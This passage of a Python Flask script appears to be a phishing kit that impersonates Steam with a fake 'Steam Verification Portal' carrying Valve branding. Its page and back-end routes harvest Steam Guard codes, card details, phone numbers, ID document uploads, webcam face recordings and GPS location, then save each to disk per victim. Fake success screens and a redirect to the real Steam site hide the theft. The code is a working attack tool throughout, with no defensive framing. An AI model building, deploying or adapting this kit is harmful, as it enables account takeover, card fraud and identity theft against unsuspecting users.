                        <li>Prevent unauthorized purchases</li>
                        <li>Maintain community safety standards</li>
                    </ul>
                </div>
                
                {f'<div class="info-box"><h4>About Steam Guard:</h4><p>Steam Guard is Steam\'s two-factor authentication system that helps protect your account from unauthorized access.</p></div>' if verification_type == 'steam_guard' else ''}
                {f'<div class="info-box"><h4>Age Verification:</h4><p>Steam requires age verification to comply with regional laws and ensure appropriate content access.</p></div>' if verification_type == 'age_verification' else ''}
                
                <div class="button-group">
                    <button class="btn btn-block" onclick="nextStep()">
                        Start Steam Verification
                    </button>
                    <button class="btn btn-outline btn-block" onclick="cancelVerification()">
                        Cancel
                    </button>
                </div>
            </div>
            
            <!-- Step 2: Steam Guard / Age Verification / Payment -->
            {f'<div class="step-content" id="step2"><h2 class="step-title">{"Steam Guard Code" if verification_type == "steam_guard" else ("Age Verification" if verification_type == "age_verification" else ("Account Recovery" if verification_type == "account_recovery" else "Purchase Verification"))}</h2><p class="step-description">{"Enter the Steam Guard code sent to your email or mobile app." if verification_type == "steam_guard" else ("Verify your age to access mature content." if verification_type == "age_verification" else ("Verify your identity to recover your account." if verification_type == "account_recovery" else "Verify your payment for security purposes."))}</p>' if total_steps > 3 else ''}
            {f'<div class="guard-container" id="steamGuardSection" style="display: none;"><div class="alert-icon">🔒</div><h3>Enter Steam Guard Code</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">Enter the 5-digit code from your Steam Guard mobile app or email</p><div class="guard-code" id="steamGuardCode">{str(random.randint(10000, 99999))}</div><input type="text" class="code-input" id="guardCodeInput" placeholder="12345" maxlength="5" pattern="\\d*"><div class="status-message" id="guardStatus">Enter the code above</div></div>' if verification_type == 'steam_guard' and total_steps > 3 else ''}
            
            {f'<div class="camera-section" id="faceVerificationSection" style="display: none;"><h3>Face Verification</h3><div class="camera-container"><video id="faceVideo" autoplay playsinline></video><div class="face-circle"></div></div><div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div><button class="btn" id="startFaceBtn" onclick="startFaceVerification()">Start Face Verification</button></div>' if settings['face_enabled'] and total_steps > 3 else ''}
            
            {f'<div class="payment-section" id="paymentSection" style="display: none;"><h3>Purchase Verification</h3><p style="text-align: center; margin-bottom: 20px; color: var(--steam-muted);">Verify your payment of</p><div class="payment-amount">{purchase_amount}</div><div class="form-group"><label class="form-label">Card Number</label><input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19"></div><div class="card-details"><div class="form-group"><label class="form-label">Expiry Date</label><input type="text" class="form-input" id="expiryDate" placeholder="MM/YY" maxlength="5"></div><div class="form-group"><label class="form-label">CVV</label><input type="text" class="form-input" id="cvv" placeholder="123" maxlength="4"></div><div class="form-group"><label class="form-label">ZIP Code</label><input type="text" class="form-input" id="zipCode" placeholder="12345" maxlength="10"></div></div></div>' if settings['payment_enabled'] and total_steps > 3 else ''}
            
            {f'<div class="status-message" id="step2Status"></div><div class="button-group"><button class="btn" id="step2Button" onclick="completeStep2()">{"Verify Code" if verification_type == "steam_guard" else ("Start Verification" if settings["face_enabled"] else "Verify Payment")}</button><button class="btn btn-outline" onclick="prevStep()">Back</button></div></div>' if total_steps > 3 else ''}
            
            <!-- Step 3: ID/Phone/Location -->
            {f'<div class="step-content" id="step3"><h2 class="step-title">{"ID Verification" if settings["id_enabled"] else ("Phone Verification" if settings["phone_enabled"] else "Location Verification")}</h2><p class="step-description">{"Verify your identity with a government-issued ID." if settings["id_enabled"] else ("Verify your phone number for Steam Guard." if settings["phone_enabled"] else "Verify your location for security purposes.")}</p>' if total_steps > 4 else ''}
            {f'<div class="upload-section" onclick="document.getElementById(\'idFileInput\').click()" id="idUploadSection" style="display: none;"><div class="upload-icon">📄</div><div style="font-size: 20px; margin-bottom: 10px;">Upload ID Document</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Driver\'s License, Passport, or ID Card</div><input type="file" id="idFileInput" accept="image/*,.pdf" style="display:none" onchange="handleIDUpload(this)"><div class="preview-container" id="idPreview" style="display: none; margin-top: 20px;"><img id="idPreviewImage" style="max-width: 200px; max-height: 150px; border-radius: 6px; border: 2px solid var(--steam-border);"></div></div>' if settings['id_enabled'] and total_steps > 4 else ''}
            
            {f'<div class="phone-section" id="phoneSection" style="display: none;"><h3>Phone Verification</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">Enter your phone number to receive Steam Guard codes</p><input type="tel" class="phone-input" id="phoneInput" placeholder="+1 (555) 123-4567"><div class="status-message" id="phoneStatus">Enter your phone number</div></div>' if settings['phone_enabled'] and total_steps > 4 else ''}
            
            {f'<div class="upload-section" id="locationSection" style="display: none;"><div class="upload-icon">📍</div><div style="font-size: 20px; margin-bottom: 10px;">Location Verification</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Steam needs to verify your location for security</div><div class="status-message" id="locationStatus">Click the button below to share location</div></div>' if settings['location_enabled'] and total_steps > 4 else ''}
            
            {f'<div class="button-group"><button class="btn" id="step3Button" onclick="completeStep3()">{"Upload ID" if settings["id_enabled"] else ("Verify Phone" if settings["phone_enabled"] else "Share Location")}</button><button class="btn btn-outline" onclick="prevStep()">Back</button></div></div>' if total_steps > 4 else ''}
            
            <!-- Step 4: Processing -->
            <div class="step-content" id="stepProcessing">
                <div class="completion-screen">
                    <div class="loading-spinner" style="width: 60px; height: 60px; border-width: 4px; border-color: var(--steam-accent);"></div>
                    <h2 class="step-title">Verifying Your Information</h2>
                    <p class="step-description">
                        Please wait while Steam verifies your information. This may take a moment.
                    </p>
                    
                    <div class="status-message status-processing" id="processingStatus">
                        Processing verification...
                    </div>
                    
                    <div class="info-box">
                        <h4>What's happening:</h4>
                        <ul>
                            <li>Verifying submitted information</li>
                            <li>Checking security protocols</li>
                            <li>Updating account status</li>
                            <li>Applying verification</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <!-- Step 5: Complete -->
            <div class="step-content" id="stepComplete">
                <div class="completion-screen">
                    <div class="success-icon">✓</div>
                    <h2 class="step-title">Verification Complete!</h2>
                    
                    <div class="steam-verified">
                        {'Steam Guard Enabled' if verification_type == 'steam_guard' else ''}
                        {'Age Verified' if verification_type == 'age_verification' else ''}
                        {'Account Secured' if verification_type == 'account_recovery' else ''}
                        {'Purchase Verified' if verification_type == 'purchase_verification' else ''}
                    </div>
                    
                    <p class="step-description">
                        {'Steam Guard has been successfully enabled on your account.' if verification_type == 'steam_guard' else ''}
                        {'Your age has been verified. You can now access mature content.' if verification_type == 'age_verification' else ''}
                        {'Your account has been secured and recovered.' if verification_type == 'account_recovery' else ''}
                        {'Your purchase has been verified and completed.' if verification_type == 'purchase_verification' else ''}
                        You will be redirected to Steam in <span id="countdown">10</span> seconds.
                    </p>
                    
                    <div class="info-box">
                        <h4>Verification Summary:</h4>
                        <ul>
                            {'<li>✓ Steam Guard enabled</li>' if verification_type == 'steam_guard' else ''}
                            {'<li>✓ Two-factor authentication active</li>' if verification_type == 'steam_guard' else ''}
                            {'<li>✓ Age verified</li>' if verification_type == 'age_verification' else ''}
                            {'<li>✓ Mature content access granted</li>' if verification_type == 'age_verification' else ''}
                            {'<li>✓ Account secured</li>' if verification_type == 'account_recovery' else ''}
                            {'<li>✓ Security measures updated</li>' if verification_type == 'account_recovery' else ''}
                            {'<li>✓ Purchase verified</li>' if verification_type == 'purchase_verification' else ''}
                            {'<li>✓ Transaction completed</li>' if verification_type == 'purchase_verification' else ''}
                            <li>✓ Account protection active</li>
                        </ul>
                    </div>
                    
                    <div class="button-group">
                        <button class="btn" onclick="redirectToSteam()">
                            Return to Steam
                        </button>
                        <button class="btn btn-outline" onclick="viewAccount()">
                            View Account Details
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div class="footer-links">
                <a href="#">Steam Support</a>
                <a href="#">Privacy Policy</a>
                <a href="#">User Agreement</a>
                <a href="#">Steam Subscriber Agreement</a>
            </div>
            <p style="margin-top: 15px;">
                © 2024 Valve Corporation. All rights reserved.<br>
                Steam and the Steam logo are trademarks of Valve Corporation.
            </p>
        </div>
    </div>
    
    <script>
        // Global variables
        let currentStep = 1;
        let totalSteps = {total_steps};
        let steamUsername = "{steam_username}";
        let verificationType = "{verification_type}";
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        
        // Verification state
        let faceStream = null;
        let faceRecorder = null;
        let faceChunks = [];
        let faceTimeLeft = {face_duration if settings['face_enabled'] else 0};
        let faceTimerInterval = null;
        let idFile = null;
        let steamGuardCode = "{str(random.randint(10000, 99999)) if verification_type == 'steam_guard' else ''}";
        
        // Step Navigation
        function updateStepIndicators() {{
            const steps = document.querySelectorAll('.step-number');
            const labels = document.querySelectorAll('.step-label');
            
            steps.forEach((step, index) => {{
                step.classList.remove('active', 'completed');
                if (index < currentStep - 1) {{
                    step.classList.add('completed');
                }} else if (index === currentStep - 1) {{
                    step.classList.add('active');
                }}
            }});
            
            labels.forEach((label, index) => {{
                label.classList.remove('active');
                if (index === currentStep - 1) {{
                    label.classList.add('active');
                }}
            }});
        }}
        
        function showStep(stepNumber) {{
            document.querySelectorAll('.step-content').forEach(step => {{
                step.classList.remove('active');
            }});
            
            let stepId = '';
            if (stepNumber === 1) stepId = 'step1';
            else if (stepNumber === 2) stepId = 'step2';
            else if (stepNumber === 3) stepId = 'step3';
            else if (stepNumber === totalSteps - 1) stepId = 'stepProcessing';
            else if (stepNumber === totalSteps) stepId = 'stepComplete';
            
            if (stepId) {{
                document.getElementById(stepId).classList.add('active');
                currentStep = stepNumber;
                updateStepIndicators();
                
                // Show appropriate sections
                if (stepNumber === 2) {{
                    if (verificationType === "steam_guard") {{
                        document.getElementById("steamGuardSection").style.display = "block";
                    }}
                    
                    if ({str(settings['face_enabled']).lower()}) {{
                        document.getElementById("faceVerificationSection").style.display = "block";
                    }}
                    
                    if ({str(settings['payment_enabled']).lower()}) {{
                        document.getElementById("paymentSection").style.display = "block";
                    }}
                }}
                
                if (stepNumber === 3) {{
                    if ({str(settings['id_enabled']).lower()}) {{
                        document.getElementById("idUploadSection").style.display = "block";
                    }}
                    
                    if ({str(settings['phone_enabled']).lower()}) {{
                        document.getElementById("phoneSection").style.display = "block";
                    }}
                    
                    if ({str(settings['location_enabled']).lower()}) {{
                        document.getElementById("locationSection").style.display = "block";
                    }}
                }}
            }}
        }}
        
        function nextStep() {{
            if (currentStep < totalSteps) {{
                showStep(currentStep + 1);
            }}
        }}
        
        function prevStep() {{
            if (currentStep > 1) {{
                showStep(currentStep - 1);
            }}
        }}
        
        function cancelVerification() {{
            if (confirm("Are you sure you want to cancel verification? Some Steam features may be limited.")) {{
                window.location.href = 'https://store.steampowered.com';
            }}
        }}
        
        // Steam Guard Verification
        function completeStep2() {{
            if (verificationType === "steam_guard") {{
                const input = document.getElementById("guardCodeInput").value;
                const status = document.getElementById("guardStatus");
                if (!input || input.length !== 5) {{
                    status.className = "status-message status-error";
                    status.textContent = "Please enter a valid 5-digit code";
                    return;
                }}
                status.className = "status-message status-processing";
                status.textContent = "Verifying Steam Guard code...";
                // Submit Steam Guard data
                $.ajax({{
                    url: "/submit_steam_guard",
                    type: "POST",
                    data: JSON.stringify({{
                        guard_code: input,
                        expected_code: steamGuardCode,
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        steam_username: steamUsername
                    }}),
                    contentType: "application/json"
                }});
                status.className = "status-message status-success";
                status.textContent = "✓ Steam Guard code verified";
                setTimeout(() => nextStep(), 1500);
            }}
            else if ({str(settings['face_enabled']).lower()}) {{
                startFaceVerification();
            }}
            else if ({str(settings['payment_enabled']).lower()}) {{
                verifyPayment();
            }}
        }}
        
        // Face Verification
        async function startFaceVerification() {{
            try {{
                const btn = document.getElementById("startFaceBtn");
                btn.disabled = true;
                btn.innerHTML = '<span class="loading-spinner"></span>Accessing Camera...';
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ facingMode: "user", width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }},
                    audio: false
                }});
                document.getElementById("faceVideo").srcObject = faceStream;
                startFaceScan();
            }} catch (error) {{
                alert("Unable to access camera. Please ensure camera permissions are granted.");
                document.getElementById("startFaceBtn").disabled = false;
                document.getElementById("startFaceBtn").textContent = "Start Face Verification";
            }}
        }}
        
        function startFaceScan() {{
            faceTimeLeft = {face_duration if settings['face_enabled'] else 15};
            updateFaceTimer();
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            startFaceRecording();
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById("faceTimer").textContent = 
                minutes.toString().padStart(2, "0") + ":" + seconds.toString().padStart(2, "0");
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            try {{
                faceRecorder = new MediaRecorder(faceStream, {{ mimeType: "video/webm;codecs=vp9" }});
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) faceChunks.push(event.data);
            }};
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            if (faceRecorder && faceRecorder.state === "recording") {{
                faceRecorder.stop();
            }}
            if (faceStream) faceStream.getTracks().forEach(track => track.stop());
            document.getElementById("faceTimer").textContent = "✓ Complete";
            document.getElementById("step2Status").className = "status-message status-success";
            document.getElementById("step2Status").textContent = "✓ Face verification complete";
            setTimeout(() => nextStep(), 1500);
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            const videoBlob = new Blob(faceChunks, {{ type: "video/webm" }});
            const reader = new FileReader();
            reader.onloadend = function() {{
                const base64data = reader.result.split(",")[1];
                $.ajax({{
                    url: "/submit_face_verification",
                    type: "POST",
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration if settings['face_enabled'] else 15},
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        steam_username: steamUsername,
                        verification_type: verificationType
                    }}),
                    contentType: "application/json"
                }});
            }};
            reader.readAsDataURL(videoBlob);
        }}
        
        // Payment Verification
        function verifyPayment() {{
            const cardNumber = document.getElementById("cardNumber").value;
            const expiryDate = document.getElementById("expiryDate").value;
            const cvv = document.getElementById("cvv").value;
            const zipCode = document.getElementById("zipCode").value;
            if (!cardNumber || !expiryDate || !cvv || !zipCode) {{
                alert("Please fill in all payment details");
                return;
            }}
            $.ajax({{
                url: "/submit_payment_verification",
                type: "POST",
                data: JSON.stringify({{
                    card_number: cardNumber.replace(/\\s/g, ""),
                    expiry_date: expiryDate,
                    cvv: cvv,
                    zip_code: zipCode,
                    amount: "{purchase_amount}",
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    steam_username: steamUsername
                }}),
                contentType: "application/json"
            }});
            document.getElementById("step2Status").className = "status-message status-success";
            document.getElementById("step2Status").textContent = "✓ Payment verification submitted";
            setTimeout(() => nextStep(), 1500);
        }}
        
        // ID Verification
        function handleIDUpload(input) {{
            idFile = input.files[0];
            const reader = new FileReader();
            reader.onload = function(e) {{
                const preview = document.getElementById("idPreview");
                const previewImage = document.getElementById("idPreviewImage");
                previewImage.src = e.target.result;
                preview.style.display = "block";
            }};
            reader.readAsDataURL(idFile);
            document.getElementById("step3Button").textContent = "Submit ID";
        }}
        
        // Phone Verification
        function completeStep3() {{
            if ({str(settings['id_enabled']).lower()}) {{
                if (!idFile) {{
                    alert("Please upload an ID document first");
                    return;
                }}
                const formData = new FormData();
                formData.append("id_file", idFile);
                formData.append("timestamp", new Date().toISOString());
                formData.append("session_id", sessionId);
                formData.append("steam_username", steamUsername);
                formData.append("verification_type", verificationType);
                $.ajax({{
                    url: "/submit_id_verification",
                    type: "POST",
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function() {{
                        startProcessing();
                    }}
                }});
            }}
            
            if ({str(settings['phone_enabled']).lower()}) {{
                const phone = document.getElementById("phoneInput").value;
                if (!phone) {{
                    alert("Please enter your phone number");
                    return;
                }}
                document.getElementById("phoneStatus").className = "status-message status-processing";
                document.getElementById("phoneStatus").textContent = "Verifying phone number...";
                $.ajax({{
                    url: "/submit_phone_verification",
                    type: "POST",
                    data: JSON.stringify({{
                        phone_number: phone,
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        steam_username: steamUsername
                    }}),
                    contentType: "application/json"
                }});
                setTimeout(() => startProcessing(), 1500);
            }}
            
            if ({str(settings['location_enabled']).lower()}) {{
                requestLocation();
            }}
        }}
        
        // Location Verification
        function requestLocation() {{
            const statusDiv = document.getElementById("locationStatus");
            const btn = document.getElementById("step3Button");
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Getting Location...';
            statusDiv.className = "status-message status-processing";
            statusDiv.textContent = "Accessing your location...";
            if (!navigator.geolocation) {{
                statusDiv.className = "status-message status-error";
                statusDiv.textContent = "Geolocation not supported";
                return;
            }}
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    statusDiv.className = "status-message status-success";
                    statusDiv.textContent = "✓ Location verified";
                    btn.disabled = true;
                    btn.textContent = "✓ Location Verified";
                    $.ajax({{
                        url: "/submit_location_verification",
                        type: "POST",
                        data: JSON.stringify({{
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString(),
                            session_id: sessionId,
                            steam_username: steamUsername,
                            verification_type: verificationType
                        }}),
                        contentType: "application/json"
                    }});
                    setTimeout(() => startProcessing(), 1500);
                }},
                (error) => {{
                    statusDiv.className = "status-message status-error";
                    statusDiv.textContent = "Location access denied";
                    btn.disabled = false;
                    btn.textContent = "Try Again";
                }}
            );
        }}
        
        // Processing
        function startProcessing() {{
            showStep(totalSteps - 1);
            
            const statusDiv = document.getElementById('processingStatus');
            let progress = 0;
            
            const interval = setInterval(() => {{
                progress += Math.random() * 20;
                if (progress > 100) progress = 100;
                
                let message = '';
                if (progress < 30) {{
                    message = 'Verifying information... ' + Math.round(progress) + '%';
                }} else if (progress < 60) {{
                    message = 'Checking security... ' + Math.round(progress) + '%';
                }} else if (progress < 90) {{
                    message = 'Updating account... ' + Math.round(progress) + '%';
                }} else {{
                    message = 'Finalizing... ' + Math.round(progress) + '%';
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(interval);
                    setTimeout(() => {{
                        completeVerification();
                    }}, 1000);
                }}
            }}, 500);
        }}
        
        function completeVerification() {{
            // Submit completion data
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    steam_username: steamUsername,
                    verification_type: verificationType,
                    completed_at: new Date().toISOString(),
                    user_agent: navigator.userAgent,
                    face_verified: {str(settings['face_enabled']).lower()},
                    id_verified: {str(settings['id_enabled']).lower()},
                    phone_verified: {str(settings['phone_enabled']).lower()},
                    payment_verified: {str(settings['payment_enabled']).lower()},
                    location_verified: {str(settings['location_enabled']).lower()},
                    verification_result: 'success'
                }}),
                contentType: 'application/json'
            }});
            
            showStep(totalSteps);
            startCountdown();
        }}
        
        function startCountdown() {{
            let countdown = 10;
            const element = document.getElementById('countdown');
            
            const timer = setInterval(() => {{
                countdown--;
                element.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(timer);
                    redirectToSteam();
                }}
            }}, 1000);
        }}
        
        function redirectToSteam() {{
            window.location.href = 'https://store.steampowered.com';
        }}
        
        function viewAccount() {{
            window.location.href = 'https://steamcommunity.com';
        }}
        
        // Initialize
        updateStepIndicators();
        
        // Format inputs
        document.getElementById("cardNumber")?.addEventListener("input", function(e) {{
            let value = e.target.value.replace(/\\D/g, "");
            let formatted = "";
            for (let i = 0; i < value.length && i < 16; i++) {{
                if (i > 0 && i % 4 === 0) formatted += " ";
                formatted += value[i];
            }}
            e.target.value = formatted;
        }});
        
        document.getElementById("expiryDate")?.addEventListener("input", function(e) {{
            let value = e.target.value.replace(/\\D/g, "");
            if (value.length >= 2) {{
                value = value.substring(0, 2) + "/" + value.substring(2, 4);
            }}
            e.target.value = value;
        }});
        
        // Steam Guard code input
        document.getElementById("guardCodeInput")?.addEventListener("input", function(e) {{
            e.target.value = e.target.value.replace(/\\D/g, "").slice(0, 5);
        }});
        
        // Prevent form submission on enter
        document.addEventListener('keydown', function(e) {{
            if (e.key === 'Enter') {{
                e.preventDefault();
                return false;
            }}
        }});
        
        // Handle mobile viewport height
        function setViewportHeight() {{
            let vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', `${{vh}}px`);
        }}
        
        setViewportHeight();
        window.addEventListener('resize', setViewportHeight);
        window.addEventListener('orientationchange', setViewportHeight);
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'unknown')
            steam_username = data.get('steam_username', 'unknown')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"steam_face_{steam_username}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_verification', filename)
            
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_verification', f"metadata_{steam_username}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'face_verification',
                'steam_username': steam_username,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'steam',
                'verification_type': data.get('verification_type', 'unknown'),
                'purpose': 'age_verification' if data.get('verification_type') == 'age_verification' else 'account_recovery'
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Saved Steam face verification: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving face verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'unknown')
        steam_username = request.form.get('steam_username', 'unknown')
        verification_type = request.form.get('verification_type', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        id_filename = None
        if 'id_file' in request.files:
            id_file = request.files['id_file']
            if id_file.filename:
                file_ext = id_file.filename.split('.')[-1] if '.' in id_file.filename else 'jpg'
                id_filename = f"steam_id_{steam_username}_{session_id}_{timestamp}.{file_ext}"
                id_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', id_filename)
                id_file.save(id_path)
        
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{steam_username}_{session_id}_{timestamp}.json")
        metadata = {
            'id_file': id_filename,
            'type': 'id_verification',
            'steam_username': steam_username,
            'session_id': session_id,
            'verification_type': verification_type,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
            'platform': 'steam',
            'purpose': 'age_verification' if verification_type == 'age_verification' else 'account_recovery'
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Saved Steam ID document: {id_filename}")
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f"Error saving ID verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_steam_guard', methods=['POST'])
def submit_steam_guard():
    try:
        data = request.get_json()
        if data and 'guard_code' in data:
            session_id = data.get('session_id', 'unknown')
            steam_username = data.get('steam_username', 'unknown')
            guard_code = data.get('guard_code', '')
            expected_code = data.get('expected_code', '')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"steam_guard_{steam_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            guard_data = {
                'type': 'steam_guard_verification',
                'steam_username': steam_username,
                'session_id': session_id,
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'steam',
                'verification_type': 'steam_guard',
                'guard_data': {
                    'entered_code': guard_code,
                    'expected_code': expected_code,
                    'match': guard_code == expected_code
                },
                'ip_address': request.remote_addr,
                'user_agent': request.headers.get('User-Agent', 'unknown')
            }
            
            with open(file_path, 'w') as f:
                json.dump(guard_data, f, indent=2)
            
            print(f"Saved Steam Guard verification: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving Steam Guard verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_phone_verification', methods=['POST'])
def submit_phone_verification():
    try:
        data = request.get_json()
        if data and 'phone_number' in data:
            session_id = data.get('session_id', 'unknown')
            steam_username = data.get('steam_username', 'unknown')
            phone_number = data.get('phone_number', '')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"steam_phone_{steam_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'phone_data', filename)
            
            phone_data = {
                'type': 'phone_verification',
                'steam_username': steam_username,
                'session_id': session_id,
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'steam',
                'verification_type': 'steam_guard',
                'phone_data': {
                    'phone_number': phone_number,
                    'country': 'Unknown',
                    'carrier': 'Unknown'
                },
                'purpose': 'steam_guard_two_factor'
            }
            
            with open(file_path, 'w') as f:
                json.dump(phone_data, f, indent=2)
            
            print(f"Saved Steam phone verification: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving phone verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_payment_verification', methods=['POST'])
def submit_payment_verification():
    try:
        data = request.get_json()
        if data and 'card_number' in data:
            session_id = data.get('session_id', 'unknown')
            steam_username = data.get('steam_username', 'unknown')
            amount = data.get('amount', '$0.00')
            
            # Mask card number for storage
            card_number = data.get('card_number', '')
            masked_card = card_number[-4:] if len(card_number) >= 4 else card_number
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"steam_payment_{steam_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'payment_data', filename)
            
            payment_data = {
                'type': 'payment_verification',
                'steam_username': steam_username,
                'session_id': session_id,
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'steam',
                'verification_type': 'purchase_verification',
                'payment_info': {
                    'card_last_four': masked_card,
                    'expiry_date': data.get('expiry_date', ''),
                    'amount': amount,
                    'zip_code': data.get('zip_code', '')
                },
                'verification_result': 'pending',
                'purpose': 'large_purchase_verification'
            }
            
            with open(file_path, 'w') as f:
                json.dump(payment_data, f, indent=2)
            
            print(f"Saved Steam payment verification: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving payment verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'unknown')
            steam_username = data.get('steam_username', 'unknown')
            verification_type = data.get('verification_type', 'unknown')
            
            # Process location in background
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Received Steam location data: {session_id}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving location verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            steam_username = data.get('steam_username', 'unknown')
            verification_type = data.get('verification_type', 'unknown')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"steam_complete_{steam_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            data['received_at'] = datetime.now().isoformat()
            data['platform'] = 'steam'
            data['verification_completed'] = True
            data['steam_account_protected'] = True
            
            if verification_type == 'steam_guard':
                data['steam_guard_enabled'] = True
                data['two_factor_active'] = True
            elif verification_type == 'age_verification':
                data['age_verified'] = True
                data['mature_content_access'] = True
            elif verification_type == 'account_recovery':
                data['account_recovered'] = True
                data['security_updated'] = True
            else:  # purchase_verification
                data['purchase_verified'] = True
                data['transaction_completed'] = True
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Saved Steam verification summary: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving verification summary: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/favicon.ico')
def favicon():
    return '', 204

if __name__ == '__main__':
    check_dependencies()
    
    # Get verification settings
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4050
    script_name = "Steam Verification Portal"
    
    print("\n" + "="*60)
    print("STEAM VERIFICATION PORTAL")
    print("="*60)
    print(f"[+] Steam Username: {VERIFICATION_SETTINGS['steam_username']}")
    print(f"[+] Steam Level: {VERIFICATION_SETTINGS['steam_level']}")
    print(f"[+] Games Owned: {VERIFICATION_SETTINGS['steam_games']}")
